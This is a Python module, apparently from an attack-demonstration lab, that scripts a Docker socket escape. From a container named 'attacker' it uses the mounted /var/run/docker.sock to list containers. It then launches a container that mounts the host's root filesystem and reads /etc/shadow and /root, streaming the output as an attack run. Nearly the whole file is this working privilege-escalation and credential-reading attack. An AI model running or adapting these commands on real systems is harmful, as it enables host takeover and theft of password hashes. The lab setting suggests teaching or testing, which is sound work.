import asyncio
from datetime import datetime
from models.attack import AttackRun


ATTACK_COMMANDS = [
    # confirm socket is accessible
    [
        "docker", "exec", "attacker",
        "docker", "-H", "unix:///var/run/docker.sock",
        "version", "--format", "Docker {{.Server.Version}}"
    ],
    # list running containers from inside attacker
    [
        "docker", "exec", "attacker",
        "docker", "-H", "unix:///var/run/docker.sock",
        "ps", "--format", "table {{.Names}}\t{{.Status}}"
    ],
    # spawn root container mounting full host fs
    [
        "docker", "exec", "attacker",
        "docker", "-H", "unix:///var/run/docker.sock",
        "run", "--rm", "-v", "/:/hostroot", "ubuntu:22.04",
        "sh", "-c",
        "echo '--- HOST IDENTITY ---'; id; hostname; uname -a; "
        "echo '--- HOST /etc/shadow (first 5 lines) ---'; cat /hostroot/etc/shadow 2>/dev/null | head -5; "
        "echo '--- HOST /root contents ---'; ls -la /hostroot/root 2>/dev/null; "
        "echo '--- DOCKER SOCKET ABUSE COMPLETE ---'"
    ],
]


async def run(run: AttackRun, broadcast_fn) -> None:
    for cmd in ATTACK_COMMANDS:
        await broadcast_fn(f"[>] CMD: {' '.join(cmd[3:])}")
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        async for line in proc.stdout:
            text = line.decode(errors="replace").rstrip()
            run.output.append(text)
            await broadcast_fn(text)
        await proc.wait()
        if proc.returncode != 0:
            run.exit_code = proc.returncode
            break

    run.finished_at = datetime.utcnow()
    run.exit_code = run.exit_code if run.exit_code is not None else 0
    run.status = "success" if run.exit_code == 0 else "failed"
    run.duration_seconds = (run.finished_at - run.started_at).total_seconds()
    await broadcast_fn(
        f"[+] ATTACK COMPLETE  exit_code={run.exit_code}  duration={run.duration_seconds:.1f}s"
    )
